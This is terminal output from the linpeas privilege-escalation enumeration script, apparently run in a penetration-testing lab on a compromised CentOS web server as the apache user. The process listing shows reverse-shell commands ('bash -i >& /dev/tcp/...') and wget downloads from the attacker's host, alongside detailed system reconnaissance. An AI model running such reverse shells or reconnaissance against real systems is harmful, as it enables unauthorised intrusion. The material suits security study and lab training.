~~~shell
bash-3.00$ ./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 2.6.9-89.EL (mockbuild@builder10.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-11)) #1 Mon Jun 22 12:19:40 EDT 2009
User & Groups: uid=48(apache) gid=48(apache) groups=48(apache)
Hostname: phoenix
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 2.6.9-89.EL (mockbuild@builder10.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-11)) #1 Mon Jun 22 12:19:40 EDT 2009
LSB Version:	:core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID:	CentOS
Description:	CentOS release 4.8 (Final)
Release:	4.8
Codename:	Final

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.6.7p5

╔══════════╣ CVEs Check
./linpeas.sh: line 1329: command: pkexec: not found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin
New path exported: /sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin:/usr/local/sbin:/usr/local/bin

╔══════════╣ Date & uptime
Sat Mar  4 01:55:54 EST 2023
 01:55:54 up  5:44,  0 users,  load average: 1.47, 1.07, 0.83

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/VolGroup00/LogVol00 /                       ext3    defaults        1 1
LABEL=/boot             /boot                   ext3    defaults        1 2
none                    /dev/pts                devpts  gid=5,mode=620  0 0
none                    /dev/shm                tmpfs   defaults        0 0
none                    /proc                   proc    defaults        0 0
none                    /sys                    sysfs   defaults        0 0
/dev/VolGroup00/LogVol01 swap                    swap    defaults        0 0
/dev/hda                /media/cdrecorder       auto    pamconsole,exec,noauto,managed 0 0

./linpeas.sh: line 1427: command: diskutil: not found
./linpeas.sh: line 1433: command: smbutil: not found
╔══════════╣ Environment
╚ Any private information inside environment variables?
CONSOLE=/dev/console
SELINUX_INIT=YES
TERM=linux
HISTSIZE=0
HISTFILESIZE=0
INIT_VERSION=sysvinit-2.85
PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin:/usr/local/sbin:/usr/local/bin
runlevel=3
RUNLEVEL=3
PWD=/tmp
LANG=C
previous=N
PREVLEVEL=N
SHLVL=5
HOME=/
HISTFILE=/dev/null
_=/bin/env

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
./linpeas.sh: line 1467: base64: command not found

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
./linpeas.sh: line 1475: base64: command not found

╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... SELinux status:		disabled
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. disabled
═╣ User namespace? ................ disabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... /proc/sys/kernel/randomize_va_space Not Found
═╣ Printer? ....................... ═╣ Is this a virtual machine? ..... No

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
./linpeas.sh: line 1763: command: docker: not found
./linpeas.sh: line 1764: command: lxc: not found
./linpeas.sh: line 1765: command: rkt: not found
./linpeas.sh: line 1766: command: kubectl: not found
./linpeas.sh: line 1767: command: podman: not found
./linpeas.sh: line 1768: command: runc: not found
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS Lambda? .......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root      1362  0.0  0.1  2788  604 ?        Ss   Mar03   0:00 udevd
./linpeas.sh: line 2266: command: capsh: not found
root      2822  0.0  0.9 21596 4808 ?        Sl   Mar03   0:01 /usr/sbin/vmtoolsd
./linpeas.sh: line 2266: command: capsh: not found
root      2869  0.0  1.4 12748 7232 ?        S    Mar03   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
./linpeas.sh: line 2266: command: capsh: not found
root      3110  0.0  0.1  3560  580 ?        Ss   Mar03   0:00 syslogd -m 0
./linpeas.sh: line 2266: command: capsh: not found
root      3114  0.0  0.0  2300  380 ?        Ss   Mar03   0:00 klogd -x
./linpeas.sh: line 2266: command: capsh: not found
rpc       3141  0.0  0.1  2528  536 ?        Ss   Mar03   0:00 portmap
./linpeas.sh: line 2266: command: capsh: not found
rpcuser   3150  0.0  0.1  3600  704 ?        Ss   Mar03   0:00 rpc.statd
./linpeas.sh: line 2266: command: capsh: not found
root      3177  0.0  0.0  4384  384 ?        Ss   Mar03   0:00 rpc.idmapd
./linpeas.sh: line 2266: command: capsh: not found
root      3242  0.0  0.0  2704  432 ?        Ss   Mar03   0:00 /usr/sbin/acpid
./linpeas.sh: line 2266: command: capsh: not found
root      3281  0.0  0.2  5260 1132 ?        Ss   Mar03   0:00 /usr/sbin/sshd
./linpeas.sh: line 2266: command: capsh: not found
root      3294  0.0  0.1  3036  748 ?        Ss   Mar03   0:00 xinetd -stayalive -pidfile /var/run/xinetd.pid
./linpeas.sh: line 2266: command: capsh: not found
root      3329  0.0  0.0  4344  500 ?        Ss   Mar03   0:00 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf --force-background
./linpeas.sh: line 2266: command: capsh: not found
root      3358  0.0  0.2  5896 1236 ?        S    Mar03   0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --err-log=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid
./linpeas.sh: line 2266: command: capsh: not found
mysql     3403  0.0  3.8 133400 19912 ?      Sl   Mar03   0:05  _ /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --socket=/var/lib/mysql/mysql.sock
./linpeas.sh: line 2266: command: capsh: not found
root      3426  0.0  0.0  2652  336 ?        Ss   Mar03   0:00 gpm -m /dev/input/mice -t imps2
./linpeas.sh: line 2266: command: capsh: not found
root      3437  0.0  1.9 20824 10288 ?       Ss   Mar03   0:00 /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   24265  0.0  1.2 21040 6672 ?        S    Mar03   0:01  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   25932  0.0  1.2 21040 6680 ?        S    Mar03   0:01  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   29331  0.0  1.2 21040 6652 ?        S    00:00   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   30653  0.0  1.2 21044 6696 ?        S    00:00   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   10839  0.0  0.1  4132 1004 ?        S    01:08   0:00  |   _ sh -c bash -i >& /dev/tcp/192.168.119.147/443 0>&1
./linpeas.sh: line 2266: command: capsh: not found
apache   10840  0.0  0.2  2552 1152 ?        S    01:08   0:00  |       _ bash -i
./linpeas.sh: line 2266: command: capsh: not found
apache   10846 95.1  0.4  4272 2124 ?        R    01:27  27:23  |           _ python -c import pty; pty.spawn("/bin/sh")
./linpeas.sh: line 2266: command: capsh: not found
apache   10847  0.0  0.2  3016 1156 pts/0    Ss+  01:27   0:00  |               _ /bin/sh
./linpeas.sh: line 2266: command: capsh: not found
apache   32217  0.0  1.3 21060 6700 ?        S    00:17   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   32218  0.0  1.2 21060 6668 ?        S    00:17   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   32220  0.0  1.2 21060 6676 ?        S    00:17   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   32233  0.0  1.2 21060 6672 ?        S    00:29   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   32665  0.0  1.2 21040 6652 ?        S    00:30   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache    2732  0.0  1.2 21040 6672 ?        S    00:30   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache    4311  0.0  1.2 21040 6648 ?        S    00:30   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache    4455  0.0  1.2 21040 6648 ?        S    00:30   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache    6029  0.0  1.2 21040 6628 ?        S    00:31   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache    8714  0.0  1.2 21040 6648 ?        S    00:31   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   10408  0.0  1.2 21044 6652 ?        S    00:31   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   10886  0.0  0.1  2352 1000 ?        S    01:53   0:00  |   _ sh -c bash -i >& /dev/tcp/192.168.119.147/443 0>&1
./linpeas.sh: line 2266: command: capsh: not found
apache   10887  0.0  0.2  3900 1160 ?        S    01:53   0:00  |       _ bash -i
./linpeas.sh: line 2266: command: capsh: not found
apache   10896  2.1  0.5  5492 2756 ?        R    01:55   0:00  |           _ /bin/sh ./linpeas.sh
./linpeas.sh: line 2266: command: capsh: not found
apache   12261  0.0  0.4  5492 2076 ?        R    01:56   0:00  |               _ /bin/sh ./linpeas.sh
./linpeas.sh: line 2266: command: capsh: not found
apache   12262  0.0  0.1  2648  784 ?        R    01:56   0:00  |                   _ ps fauxwww
./linpeas.sh: line 2266: command: capsh: not found
apache   10544  0.0  1.2 21040 6676 ?        S    00:31   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   10685  0.0  1.2 21040 6644 ?        S    00:31   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   10868  0.0  0.1  3700 1004 ?        S    01:34   0:00  |   _ sh -c bash -i >& /dev/tcp/192.168.119.147/443 0>&1
./linpeas.sh: line 2266: command: capsh: not found
apache   10869  0.0  0.2  2652 1152 ?        S    01:34   0:00  |       _ bash -i
./linpeas.sh: line 2266: command: capsh: not found
apache   10885  0.0  0.1  3944  936 ?        S    01:53   0:00  |           _ wget 192.168.119.147:8000/linpeas.sh
./linpeas.sh: line 2266: command: capsh: not found
apache   10686  0.0  1.2 21044 6652 ?        S    00:31   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   10850  0.0  0.1  3044 1004 ?        S    01:28   0:00  |   _ sh -c bash -i >& /dev/tcp/192.168.119.147/443 0>&1
./linpeas.sh: line 2266: command: capsh: not found
apache   10851  0.0  0.2  3036 1164 ?        S    01:28   0:00  |       _ bash -i
./linpeas.sh: line 2266: command: capsh: not found
apache   10860  0.0  0.1  3996  940 ?        S    01:30   0:00  |           _ wget 192.168.119.147:8000/linpeas.sh
./linpeas.sh: line 2266: command: capsh: not found
apache   10687  0.0  1.2 21044 6676 ?        S    00:31   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
apache   10688  0.0  1.2 21040 6652 ?        S    00:31   0:00  _ /usr/sbin/httpd
./linpeas.sh: line 2266: command: capsh: not found
root      3446  0.0  0.2  5588 1040 ?        Ss   Mar03   0:00 crond
./linpeas.sh: line 2266: command: capsh: not found
xfs       3484  0.0  0.2  3664 1340 ?        Ss   Mar03   0:00 xfs -droppriv -daemon
./linpeas.sh: line 2266: command: capsh: not found
root      3493  0.0  0.5 11964 2736 ?        Ss   Mar03   0:00 smbd -D
./linpeas.sh: line 2266: command: capsh: not found
root      3524  0.0  0.1 11964  988 ?        S    Mar03   0:00  _ smbd -D
./linpeas.sh: line 2266: command: capsh: not found
root      3497  0.0  0.2  8928 1464 ?        Ss   Mar03   0:00 nmbd -D
./linpeas.sh: line 2266: command: capsh: not found
root      3514  0.0  0.0  3584  432 ?        Ss   Mar03   0:00 /usr/sbin/atd
./linpeas.sh: line 2266: command: capsh: not found
dbus      3525  0.0  0.1  3772  804 ?        Ss   Mar03   0:00 dbus-daemon-1 --system
./linpeas.sh: line 2266: command: capsh: not found
root      3536  0.0  0.5  5692 2776 ?        Ss   Mar03   0:05 hald
./linpeas.sh: line 2266: command: capsh: not found
root      3543  0.0  0.0  2040  396 tty1     Ss+  Mar03   0:00 /sbin/mingetty tty1
./linpeas.sh: line 2266: command: capsh: not found
root      3544  0.0  0.0  1728  392 tty2     Ss+  Mar03   0:00 /sbin/mingetty tty2
./linpeas.sh: line 2266: command: capsh: not found
root      3545  0.0  0.0  3056  396 tty3     Ss+  Mar03   0:00 /sbin/mingetty tty3
./linpeas.sh: line 2266: command: capsh: not found
root      3546  0.0  0.0  1832  396 tty4     Ss+  Mar03   0:00 /sbin/mingetty tty4
./linpeas.sh: line 2266: command: capsh: not found
root      3547  0.0  0.0  2304  396 tty5     Ss+  Mar03   0:00 /sbin/mingetty tty5
./linpeas.sh: line 2266: command: capsh: not found
root      3548  0.0  0.0  2304  396 tty6     Ss+  Mar03   0:00 /sbin/mingetty tty6
./linpeas.sh: line 2266: command: capsh: not found
root     15741  0.0  0.4  8820 2264 ?        SNs  Mar03   0:00 cupsd
./linpeas.sh: line 2266: command: capsh: not found

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID    USER   FD      TYPE DEVICE     SIZE      NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd process found (dump creds from memory as root)
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r--  1 root root    0 Sep 16  2009 /etc/cron.deny
-rw-r--r--  1 root root  255 Feb 21  2005 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root  4096 Jun  1  2009 .
drwxr-xr-x  81 root root 12288 Mar  3 21:17 ..

/etc/cron.daily:
total 108
drwxr-xr-x   2 root root  4096 Sep 16  2009 .
drwxr-xr-x  81 root root 12288 Mar  3 21:17 ..
lrwxrwxrwx   1 root root    28 Sep 16  2009 00-logwatch -> ../log.d/scripts/logwatch.pl
-rwxr-xr-x   1 root root   418 Nov 17  2007 00-makewhatis.cron
-rwxr-xr-x   1 root root   135 Feb 21  2005 00webalizer
-rwxr-xr-x   1 root root   276 Feb 21  2005 0anacron
-rwxr-xr-x   1 root root  1042 Jan 29  2008 certwatch
-rwxr-xr-x   1 root root   180 Jul 25  2008 logrotate
-rwxr-xr-x   1 root root  2133 Dec  1  2004 prelink
-rwxr-xr-x   1 root root   104 Jun  1  2009 rpm
-rwxr-xr-x   1 root root   121 Nov 16  2007 slocate.cron
-rwxr-xr-x   1 root root   286 Jun  1  2009 tmpwatch
-rwxr-xr-x   1 root root   158 Nov 18  2007 yum.cron

/etc/cron.hourly:
total 24
drwxr-xr-x   2 root root  4096 Feb 21  2005 .
drwxr-xr-x  81 root root 12288 Mar  3 21:17 ..

/etc/cron.monthly:
total 32
drwxr-xr-x   2 root root  4096 Sep 16  2009 .
drwxr-xr-x  81 root root 12288 Mar  3 21:17 ..
-rwxr-xr-x   1 root root   278 Feb 21  2005 0anacron

/etc/cron.weekly:
total 48
drwxr-xr-x   2 root root  4096 Sep 16  2009 .
drwxr-xr-x  81 root root 12288 Mar  3 21:17 ..
-rwxr-xr-x   1 root root   414 Nov 17  2007 00-makewhatis.cron
-rwxr-xr-x   1 root root   277 Feb 21  2005 0anacron
-rwxr-xr-x   1 root root    90 Nov 18  2007 yum.cron

/var/spool/anacron:
total 28
drwxr-xr-x   2 root root 4096 Sep 16  2009 .
drwxr-xr-x  15 root root 4096 Sep 16  2009 ..
-rw-------   1 root root    9 Mar  3 21:17 cron.daily
-rw-------   1 root root    9 Mar  3 21:18 cron.monthly
-rw-------   1 root root    9 Mar  3 21:18 cron.weekly
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

01 * * * * root run-parts /etc/cron.hourly
02 4 * * * root run-parts /etc/cron.daily
22 4 * * 0 root run-parts /etc/cron.weekly
42 4 1 * * root run-parts /etc/cron.monthly


SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

1	65	cron.daily		run-parts /etc/cron.daily
7	70	cron.weekly		run-parts /etc/cron.weekly
30	75	cron.monthly		run-parts /etc/cron.monthly

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/dev/gpmctl
  └─(Read Write)
/dev/log
  └─(Read Write)
/tmp/.font-unix/fs7100
/var/lib/mysql/mysql.sock
  └─(Read Write)
/var/run/acpid.socket
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/hal.conf (  <policy user="haldaemon">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
busctl Not Found


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
127.0.0.1 localhost
127.0.0.1 phoenix
nameserver 10.11.1.220
nameserver 10.11.1.221

╔══════════╣ Interfaces
eth0      Link encap:Ethernet  HWaddr 00:50:56:86:20:CB  
          inet addr:10.11.1.8  Bcast:10.11.255.255  Mask:255.255.0.0
          inet6 addr: fe80::250:56ff:fe86:20cb/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:525351 errors:0 dropped:0 overruns:0 frame:0
          TX packets:502886 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:59978116 (57.1 MiB)  TX bytes:265094652 (252.8 MiB)
          Interrupt:185 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:1496 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1496 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:107866 (105.3 KiB)  TX bytes:107866 (105.3 KiB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      -                   
tcp        0      0 0.0.0.0:139                 0.0.0.0:*                   LISTEN      -                   
tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN      -                   
tcp        0      0 0.0.0.0:788                 0.0.0.0:*                   LISTEN      -                   
tcp        0      0 0.0.0.0:21                  0.0.0.0:*                   LISTEN      -                   
tcp        0      0 0.0.0.0:631                 0.0.0.0:*                   LISTEN      -                   
tcp        0      0 0.0.0.0:445                 0.0.0.0:*                   LISTEN      -                   
tcp        0      0 :::80                       :::*                        LISTEN      10839/sh            
tcp        0      0 :::22                       :::*                        LISTEN      -                   
tcp        0      0 :::443                      :::*                        LISTEN      10839/sh            

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=48(apache) gid=48(apache) groups=48(apache)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled ()
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel)
uid=1(bin) gid=1(bin) groups=1(bin),2(daemon[0m),3(sys)
uid=10(uucp) gid=14(uucp) groups=14(uucp)
uid=11(operator) gid=0(root) groups=0(root)
uid=12(games) gid=100(users) groups=100(users)
uid=13(gopher) gid=30(gopher) groups=30(gopher)
uid=14(ftp) gid=50(ftp) groups=50(ftp)
uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m),1(bin),4(adm),7(lp)
uid=23(squid) gid=23(squid) groups=23(squid)
uid=27(mysql) gid=27(mysql) groups=27(mysql)
uid=28(nscd) gid=28(nscd) groups=28(nscd)
uid=29(rpcuser) gid=29(rpcuser) groups=29(rpcuser)
uid=3(adm) gid=4(adm) groups=4(adm),3(sys)
uid=32(rpc) gid=32(rpc) groups=32(rpc)
uid=34(netdump) gid=34(netdump) groups=34(netdump)
uid=37(rpm) gid=37(rpm) groups=37(rpm)
uid=38(ntp) gid=38(ntp) groups=38(ntp)
uid=4(lp) gid=7(lp) groups=7(lp)
uid=43(xfs) gid=43(xfs) groups=43(xfs)
uid=47(mailnull) gid=47(mailnull) groups=47(mailnull)
uid=48(apache) gid=48(apache) groups=48(apache)
uid=5(sync) gid=0(root) groups=0(root)
uid=51(smmsp) gid=51(smmsp) groups=51(smmsp)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=65534(nfsnobody) gid=65534(nfsnobody) groups=65534(nfsnobody)
uid=67(webalizer) gid=67(webalizer) groups=67(webalizer)
uid=68(haldaemon[0m) gid=68(haldaemon[0m) groups=68(haldaemon[0m)
uid=69(vcsa) gid=69(vcsa) groups=69(vcsa)
uid=7(halt) gid=0(root) groups=0(root)
uid=74(sshd) gid=74(sshd) groups=74(sshd)
uid=77(pcap) gid=77(pcap) groups=77(pcap)
uid=8(mail) gid=12(mail) groups=12(mail)
uid=81(dbus) gid=81(dbus) groups=81(dbus)
uid=9(news) gid=13(news) groups=13(news)
uid=99(nobody) gid=99(nobody) groups=99(nobody)

╔══════════╣ Login now
 01:56:33 up  5:45,  0 users,  load average: 1.84, 1.20, 0.88
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons

wtmp begins Fri Mar  3 21:17:30 2023

╔══════════╣ Last time logon each user

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
